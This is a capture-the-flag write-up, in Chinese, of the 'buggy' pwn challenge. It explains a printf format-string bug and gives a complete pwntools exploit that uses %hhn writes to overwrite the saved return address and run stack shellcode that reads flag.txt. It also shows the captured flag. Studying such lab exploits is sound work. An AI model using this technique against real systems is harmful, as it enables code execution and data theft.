# buggy

## 题目简述

银行程序在 `DEBUG` 模式下直接打印栈上 `inputBuffer` 和 `balance` 的地址，并在存款、取款分支中执行 `printf(inputBuffer)`。二进制启用了 PIE、完整 RELRO 和编译器栈保护，但 GNU stack 标记为 RWE。格式化字符串漏洞可以绕过普通缓冲区边界，直接逐字节改写保存的返回地址；地址泄漏则给出当前栈位置，最终跳到同一输入缓冲区中的 `open/read/write` shellcode。

## 解题过程

官方构建中，`inputBuffer` 到保存返回地址的偏移为 `0x418`，计划把 shellcode 放在缓冲区偏移 `0x100`。由于 shellcode 和返回地址都相对泄漏的缓冲区地址计算，PIE 与栈 ASLR 不再构成障碍；写入也不触碰栈 canary。

格式串先用 27 个 `%c` 走到攻击者布置在栈上的伪参数区。每写一个地址字节，就用 `%Nc` 把累计输出字符数调整到目标值，再以 `%hhn` 只写低 8 位。格式串在偏移 128 处以 NUL 终止，但后面的伪参数仍留在栈内供 `printf` 读取。

```python
from pwn import asm, context, p64, remote

context.arch = "amd64"
io = remote("challenge-host", 12345)

leak = io.recvline()
buffer_address = int(leak.split(b",")[0], 16)
return_address = buffer_address + 0x418
shellcode_address = buffer_address + 0x100

fmt = b"%c" * 27
printed = 27
for wanted in p64(shellcode_address):
    delta = (wanted - printed) % 256
    if delta == 0:
        delta = 256
    fmt += f"%{delta}c%hhn".encode()
    printed += delta

payload = fmt.ljust(128, b"\x00")
for index in range(8):
    # 每个 %c 消耗一个 0，每个 %hhn 消耗下一个目标指针。
    payload += p64(0) + p64(return_address + index)

assert len(payload) == 0x100
payload += asm(r"""
    push rbp
    mov rbp, rsp
    sub rsp, 0x50

    movabs rax, 0x7478742e67616c66
    mov qword ptr [rbp-0x10], rax
    mov qword ptr [rbp-0x08], 0

    lea rdi, [rbp-0x10]
    xor esi, esi
    mov eax, 2
    syscall

    mov rdi, rax
    lea rsi, [rbp-0x50]
    mov edx, 0x40
    xor eax, eax
    syscall

    mov rdx, rax
    mov edi, 1
    lea rsi, [rbp-0x50]
    mov eax, 1
    syscall

    xor edi, edi
    mov eax, 60
    syscall
""")

io.sendlineafter(b"exit) ", b"deposit")
io.sendafter(b"amount: ", payload + b"\n")
io.sendline(b"exit")
print(io.recvall().decode(errors="replace"))
```

shellcode 直接读取当前目录的 `flag.txt`，输出为：

```text
tjctf{sys_c4ll3d_l1nux_294835}
```

`0x418`、27 个参数和偏移 `0x100` 都属于该构建的栈布局，迁移到其他编译结果时应在调试器中重新确认。

## 方法总结

- 核心技巧：用格式串 `%hhn` 按字节覆盖保存返回地址，再跳入已知栈地址上的 shellcode。
- 识别信号：`printf(user_input)`、调试地址泄漏和可执行栈同时出现；RELRO 并不能阻止栈返回地址写入。
- 复用要点：区分“累计打印字符数”和“格式参数消耗数”，逐字节写入时对 256 取模；保持 canary 不变比尝试覆盖整个栈帧更稳。
